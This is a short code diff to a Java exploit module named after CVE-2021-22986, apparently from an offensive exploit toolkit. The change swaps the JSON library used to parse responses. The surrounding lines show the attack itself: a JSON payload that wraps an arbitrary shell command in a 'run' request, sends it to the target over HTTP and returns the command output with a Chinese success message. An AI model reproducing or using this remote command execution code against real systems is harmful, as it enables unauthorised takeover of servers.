@@ -1,8 +1,8 @@
 package com.yhy.core;
 
+import com.alibaba.fastjson.JSONObject;
 import com.yhy.tools.HttpTool;
 import com.yhy.tools.Tools;
-import org.json.JSONObject;
 
 import java.util.HashMap;
 import java.util.UUID;
@@ -71,9 +71,8 @@ public class CVE_2021_22986 implements ExploitInterface{
             String payload = String.format("{\"command\":\"run\",\"utilCmdArgs\":\"-c %s\"}", cmd);
             String result = HttpTool.postHttpReuest(path, payload, encoding, map, "application/json");
 
-            JSONObject jsonObj = new JSONObject(result);
-            result = jsonObj.getString("commandResult");
-
+            JSONObject object = JSONObject.parseObject(result);
+            result = object.getString("commandResult");
 
             return result + "\r\n 命令执行成功";
 
